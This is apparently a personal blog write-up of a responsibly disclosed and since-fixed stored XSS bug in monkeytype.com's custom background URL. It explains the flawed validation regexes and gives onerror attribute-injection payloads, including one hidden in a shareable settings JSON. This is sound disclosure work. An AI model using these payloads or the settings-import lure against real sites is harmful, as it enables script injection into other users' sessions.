---
layout: post
title:  "Monkeytype XSS"
date:   2024-05-22 13:15:45 -0400
categories: wild monkeytype
tags: writeup monkeytype XSS wild
---
How I got the white hat badge on monkeytype.com by finding a 
`Cross Site Scripting` vulnerability!

## Introduction
[Monkeytype](https://monkeytype.com/){:target="_blank"}{:rel="noopener noreferrer"}
is a website to test your typing speed. 
This concept isn't new but what sets this apart from its 
competitors is its extremely customizable UI. While I see 
this as the site's greatest strength, it also made it vulnerable.

A month prior to this discovery, [monkeytype introduced badges](https://github.com/monkeytypegame/monkeytype/releases/tag/v1.15.2){:target="_blank"}{:rel="noopener noreferrer"}
which would present an achievement to other users. One of these badges, the 
white hat badge, was for reporting a critical vulnerability. I really 
enjoy using this platform so the day I found this out, I started hunting 
and found something interesting...

## TLDR
Improper sanitization of user input in the custom background URL 
setting leads to XSS through the `onerror` attribute.

## What is an XSS?
XSS also known as [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/){:target="_blank"}{:rel="noopener noreferrer"}
is essentially JavaScript Injection.
Many actions a user can execute on a webpage can be simulated with 
JavaScript. Making requests, changing account information, editing site 
appearance, etc. JavaScript is usually executed in the browser from 
trusted sources (the website you're visiting), but this type of attack 
allows an attacker to run malicious scripts not originally from the website.
A common proof of concept is by running the `alert()` function, though 
there are many possibilities once a vulnerability is discovered.

## Discovery
First I checked how user input was handled and sanitized. The field 
with the most potential sets the custom background. This is done 
with a URL provided by the user and placed 
[directly into the HTML source](https://github.com/monkeytypegame/monkeytype/commit/728a28c0b3ae078a04e1a3830bb8a2dad6ff99ac){:target="_blank"}{:rel="noopener noreferrer"}

![html-input](/images/monkeytype/monkeytype-html-input.png)

JQuery's html function has the [potential to be a security risk](https://stackoverflow.com/questions/49396862/jquery-html-method-a-security-risk-like-innerhtml){:target="_blank"}{:rel="noopener noreferrer"}
if  used with unsanitized user input. At the time of investigation, 
validation was achieved with [the following code](https://github.com/monkeytypegame/monkeytype/commit/c5dae38d70973f3953e5ba409ef92229b8a8b74a){:target="_blank"}{:rel="noopener noreferrer"}

![regex](/images/monkeytype/monkeytype-regex1.png)

If the user's string passes these [regular expression](https://en.wikipedia.org/wiki/Regular_expression){:target="_blank"}{:rel="noopener noreferrer"}
conditionals (regex), then our input will be placed into the page.

### Regex Breakdown

Let's work backwards from here. The second regex is a patch that was 
[introduced on 7/22/21](https://github.com/monkeytypegame/monkeytype/commit/c5dae38d70973f3953e5ba409ef92229b8a8b74a){:target="_blank"}{:rel="noopener noreferrer"}

```bash
!/[<>]/
```

Its intent is to filter out angled brackets to prevent the user from 
inputting arbitrary HTML tags such as `<script>`

```html
<!-- example placing our input directly into the source !-->
<img src="user_input">
var user_input = example
<img src="example">

<!-- no longer possible! !-->
var user_input = "> <script>alert(1);</script>
<!-- notice how the syntax highlighting changes !-->
<img src=""> <script>alert(1);</script>"
```

This stops some paths to XSS, but not all of them. Let's dig deeper 
into the first regex which was 
[introduced on 4/4/21](https://github.com/monkeytypegame/monkeytype/commit/bdfab7caeff8d0c3a9e249c981268470ccf3cb1c){:target="_blank"}{:rel="noopener noreferrer"}

```bash
/(https|http):\/\/(www\.|).+\..+\/.+(\.png|\.gif|\.jpeg|\.jpg)/gi
```

We can break this up into three smaller expressions

```bash
(https|http):\/\/(www\.|)
```

This requires the user input to begin with `http://` or `https://` 
followed by an optional `www.` JavaScript is now unable to run in the 
source like this

```html
<img src="javascript:alert(1)">
```

The next regex section introduces some issues

```bash
.+\..+\/.+
```

The combination `.+` signifies any combination of characters with 
a length of at least 1. For example

```
g
google
spaces are valid too
127
ewaoijfA()SDFJQWE)R"OKAS{}L:":
```

The backslash character `\` followed be a special regex character will match
a literal version of the special character in the string.

`\.` refers to a single literal dot `.`

`\/` refers to a 
single forward slash character `/`

```
.+\..+\/.+
```

When put together, this section is intended to validate the hostname
(`google.com`) or an IP address (`127.0.0.1`) along with a path to the 
resource (`/images/sokka.png`).

```bash
.+   \..+\/.+
google.com/images/sokka.png
.+ = google
\. = .
.+ = com
\/ = /
.+ = images/sokka.png
```

So what's wrong with this?

The dot regex character will allow us to use characters that aren't 
normally found in a host name. By using double quotes and spaces we 
escape the source attribute

```html
<img src="user_input">
var user_input = example
<img src="example">

var user_input = " everything here is controllable
<img src="" everything here is controllable">

var user_input = " alt="user added alt tag
<img src="" alt="user added alt tag">
```

With the ability to add arbitrary attributes, we are able to 
[inject our own code](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet){:target="_blank"}{:rel="noopener noreferrer"}.
By using `onerror`,  we can make arbitrary JavaScript 
execute when the image fails to load. Since we also control the 
image link, we can link an invalid file and execute code every time.

```html
var user_input = http://not.real.com/" onerror="alert('XSS')
<img src="http://not.real.com/" onerror="alert('XSS')">
```

Now for the final part of the regular expression

```bash
(\.png|\.gif|\.jpeg|\.jpg)/gi
```

This requires the user input to end with one of these four strings
```
.png
.gif
.jpeg
.jpg
```

The intention is to have the URL point to a particular file type.

```
http://google.com/sokka.gif
```

However, this doesn't guarantee a file with this file type. By 
setting [HTTP parameters in a query string](https://en.wikipedia.org/wiki/Query_string){:target="_blank"}{:rel="noopener noreferrer"}
we can point the link to an arbitrary file or send a GET request to an arbitrary endpoint

```
https://back.con/transfer.php?amount=100
```

This will send an HTTP GET request to bank.com/transfer.php with the 
values `amount` set to `100`.

So what if we **place the extension in the parameter?**

```
https://evil.com/?ext=.png
```

## Exploit

So by combining all of these elements we can craft a malicious link 
which will be placed directly into the HTML source

```
https://www.evil.com/"onerror="alert('window.origin: ' + window.origin + '\nDasian#1967');"?.png
```

We place this into the custom background section and...

![xss](/images/monkeytype/monkeytype-xss.png)

XSS has been discovered!!!

The settings for this website are saved and the XSS payload will 
run every time the site is visited or refreshed. It may seem 
impractical for a user to input such a malicious website on purpose, 
but there is another way to update settings which makes the malicious 
activity sneakier

Rather than inputting the malicious link directly, there is an option 
to paste a full theme from JSON. This makes it easier to share themes 
between friends, but these files can be large. It's now much harder 
for a user to notice anything suspicious

```json
{"theme":"matrix","themeLight":"serika","themeDark":"serika_dark",
"autoSwitchTheme":true,"customTheme":false,
"customThemeColors":["#323437","#e2b714","#e2b714","#646669",
"#000000","#d1d0c5","#ca4754","#7e2a33","#ca4754","#7e2a33"],
"favThemes":["matrix"],"showKeyTips":true,"showLiveWpm":false,
"showTimerProgress":true,"smoothCaret":true,"quickRestart":"off",
"punctuation":false,"numbers":false,"words":100,"time":60,"mode":"time",
"quoteLength":[0],"language":"english","fontSize":"15","freedomMode":false,
"difficulty":"normal","blindMode":false,"quickEnd":false,
"caretStyle":"default","paceCaretStyle":"default","flipTestColors":false,
"layout":"default","funbox":"none","confidenceMode":"off",
"indicateTypos":"off","timerStyle":"mini","colorfulMode":false,
"randomTheme":"fav","timerColor":"main","timerOpacity":"1",
"stopOnError":"off","showAllLines":true,"keymapMode":"off",
"keymapStyle":"staggered","keymapLegendStyle":"lowercase",
"keymapLayout":"overrideSync","fontFamily":"Roboto_Mono",
"smoothLineScroll":true,"alwaysShowDecimalPlaces":false,
"alwaysShowWordsHistory":false,"singleListCommandLine":"manual",
"capsLockWarning":true,"playSoundOnError":false,"playSoundOnClick":"6",
"soundVolume":"0.5","startGraphsAtZero":true,"showOutOfFocusWarning":true,
"paceCaret":"off","paceCaretCustomSpeed":100,"repeatedPace":true,
"pageWidth":"100","chartAccuracy":true,"chartStyle":"line",
"minWpm":"off","minWpmCustomSpeed":100,"highlightMode":"letter",
"alwaysShowCPM":false,"ads":"off","hideExtraLetters":false,
"strictSpace":false,"minAcc":"off","minAccCustom":90,
"showLiveAcc":false,"showLiveBurst":false,"monkey":false,
"repeatQuotes":"off","oppositeShiftMode":"off",
"customBackground":"https://www.tmp.monkeytype.com/\"onerror=\"alert('imported settings\\nwindow.origin:'+window.origin+'\\nDasian#1967');\"?.png",
"customBackgroundSize":"contain","customBackgroundFilter":[0,1,1,1,1],
"customLayoutfluid":"qwerty#dvorak#colemak","monkeyPowerLevel":"off",
"minBurst":"off","minBurstCustomSpeed":100,"burstHeatmap":true,
"britishEnglish":false,"lazyMode":false,"showAverage":"off"}
```

Importing these settings would also result in an XSS

![json-xss](/images/monkeytype/monkeytype-json-xss.png)

## Result
Upon finding and reporting this vulnerability,
[a fix was quickly implemented](https://github.com/monkeytypegame/monkeytype/commit/26b72d6b6c2b220a4efa8f4ff4358be09430420f){:target="_blank"}{:rel="noopener noreferrer"}.
By adding a filter for spaces and double quotes, this 
exploit no longer works.

![xss-fix](/images/monkeytype/monkeytype-fix.png)

I also received 
[the white hat badge](https://monkeytype.com/profile/Dasian){:target="_blank"}{:rel="noopener noreferrer"}
which was the goal all along!

![badge](/images/monkeytype/monkeytype-badge.png)

Thanks for reading!

## Timeline
Settings code is in [frontend/src/ts/config.ts](https://github.com/monkeytypegame/monkeytype/blob/3f3c041464a2105afe959a6f7a6c34f013dea8a6/frontend/src/ts/config.ts#L1617){:target="_blank"}{:rel="noopener noreferrer"}

[First regex appearance](https://github.com/monkeytypegame/monkeytype/commit/bdfab7caeff8d0c3a9e249c981268470ccf3cb1c){:target="_blank"}{:rel="noopener noreferrer"} - 4/4/21

[Added script tag filtering](https://github.com/monkeytypegame/monkeytype/commit/c5dae38d70973f3953e5ba409ef92229b8a8b74a){:target="_blank"}{:rel="noopener noreferrer"} - 7/22/21

[JQuery html input](https://github.com/monkeytypegame/monkeytype/commit/728a28c0b3ae078a04e1a3830bb8a2dad6ff99ac){:target="_blank"}{:rel="noopener noreferrer"} - 2/19/22

XSS reported - 8/1/22

[Filtering space and double quote from input (fix)](https://github.com/monkeytypegame/monkeytype/commit/26b72d6b6c2b220a4efa8f4ff4358be09430420f){:target="_blank"}{:rel="noopener noreferrer"} - 8/2/22

Version [1.15.3](https://github.com/monkeytypegame/monkeytype/releases/tag/v1.15.3){:target="_blank"}{:rel="noopener noreferrer"}
released - 8/5/22

Versions [<=1.15.2](https://github.com/monkeytypegame/monkeytype/releases/tag/v1.15.2){:target="_blank"}{:rel="noopener noreferrer"}
that have this setting are vulnerable
